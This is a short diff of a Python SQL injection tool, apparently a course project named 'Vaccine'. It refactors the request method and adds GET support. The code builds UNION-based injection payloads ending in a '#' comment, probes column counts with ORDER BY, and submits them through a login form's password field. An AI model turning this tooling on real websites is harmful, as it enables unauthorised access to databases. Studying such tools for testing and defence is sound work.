@@ -36,18 +36,18 @@ def print_diff(str1, str2):
 	print(diff_str)
 
 class Union:
-	def __init__(self, post):
-		self.post = post
+	def __init__(self, submit):
+		self.submit = submit
 		self.delimiter = "'"
 		self.header = self.delimiter + " UNION "
 		self.comment = "#"
-		self.original_text = self.post("").text
+		self.original_text = self.submit("").text
 
 	def check_num_colums(self):
 		i = 3
 		q = f"ORDER BY {i}"
 		query = self.header + q + self.comment
-		res = self.post(query)
+		res = self.submit(query)
 		print_diff(self.original_text, res.text)
 
 	def union(self):
@@ -124,7 +124,7 @@ class Vaccine:
 			error_exit(f"{self.url} - {response}")
 		return response.text
 
-	def post(self, password, username=""):
+	def submit(self, password, username=""):
 		if self.username_field_name:
 			data = {
 				self.username_field_name: username,
@@ -135,12 +135,15 @@ class Vaccine:
 				self.password_field_name: password
 			}
 
-		res = requests.post(self.request_url, data=data, cookies=cookies)
+		if self.method == "get":
+			res = requests.get(self.request_url, data=data, cookies=cookies)
+		elif self.method == "post":
+			res = requests.post(self.request_url, data=data, cookies=cookies)
 		return res
 
 	def vaccine(self):
-		self.post("admin", "aaa")
-		u = Union(self.post)
+		self.submit("admin", "aaa")
+		u = Union(self.submit)
 		u.union()
 
 def validate_args(args):
